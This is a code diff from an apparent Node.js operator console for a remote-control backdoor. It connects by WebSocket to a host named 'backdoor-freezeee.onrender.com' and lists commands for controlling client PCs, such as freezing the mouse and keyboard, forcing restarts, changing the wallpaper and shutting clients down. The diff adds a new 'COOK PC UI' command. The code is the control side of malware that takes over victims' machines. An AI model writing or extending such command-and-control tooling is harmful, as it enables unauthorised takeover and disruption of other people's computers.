@@ -5,7 +5,7 @@ require("dotenv").config()
 
 const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
 
-const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nBYE - Turns off a client\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
+const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nCUI - COOK PC UI!!\nBYE - Turns off a client\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -19,6 +19,7 @@ const commandsMap = {
   "UK": "UNFREEZE_KEYBOARD",
   "I": "IMAGE",
   "C": "CALCULATOR",
+  "CUI": "COOK_PC_UI",
   "AU": "AUDIO",
   "CW": "CHANGE_WALLPAPER",
   "BYE": "BYE",
